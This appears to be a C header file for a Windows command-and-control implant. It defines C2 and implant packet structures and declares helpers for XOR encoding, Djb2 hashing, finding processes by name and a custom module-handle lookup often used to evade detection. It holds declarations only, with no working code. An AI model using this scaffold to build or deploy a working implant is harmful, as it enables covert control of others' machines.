#pragma once

#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>

#include <ws2tcpip.h>
#include <wininet.h>

#include <tlhelp32.h>

#include <stdio.h>
#include <stdlib.h>

#include <winternl.h>
#include <windows.h>

typedef struct _C2_PACKET {
    DWORD CmdId;
    BYTE  Data[1024];
} C2_PACKET, *PC2_PACKET;

typedef struct _IMPLANT_PACKET {
    DWORD djb2W_checksum;
    BYTE Data[1024];
} IMPLANT_PACKET, *PIMPLANT_PACKET;

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz);
void hexdump(char *data, size_t size);
DWORD Djb2W(BYTE* data);
int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID);
HMODULE CustomGetModuleHandleW(LPCWSTR moduleName);
LPCWSTR ConvertDataToLPCWSTR(BYTE* Data);